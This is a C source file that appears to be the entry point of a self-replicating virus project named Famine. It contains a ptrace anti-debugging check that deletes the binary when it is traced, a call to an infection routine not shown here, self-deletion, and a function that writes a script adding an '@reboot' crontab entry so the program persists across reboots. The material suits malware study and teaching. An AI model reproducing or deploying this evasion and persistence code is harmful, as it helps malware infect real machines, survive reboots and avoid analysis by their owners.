#include "famine_bonus.h"

void create_autorun_script(const char *program_name)
{
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) == NULL)
    {
        perror("getcwd() error");
        return;
    }
    // Create the script content
    const char *script_name = ".install_autorun.sh";
    FILE *fp = fopen(script_name, "w");
    if (!fp)
    {
        perror("Failed to create script file");
        return;
    }

    fprintf(fp,
        "#!/bin/bash\n"
        "(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -\n",
        program_name
    );

    fclose(fp);

    // Make the script executable
    char chmod_cmd[256];
    snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x %s", script_name);
    system(chmod_cmd);

    printf("Startup install script '%s' created.\n", script_name);
}

int main(int argc, char **argv)
{
    char path[4096];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1)
    {
        //perror("readlink failed");
        return 1;
    }
    if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1)
    {
        unlink(path);
        return 0;
    }
    path[len] = '\0';
    run_infection();
    if (argc < 2 || (strlen(argv[1]) == 1 && atoi(argv[1]) == 1))
        unlink(path);
    else
        create_autorun_script(path);
    return 0;
}
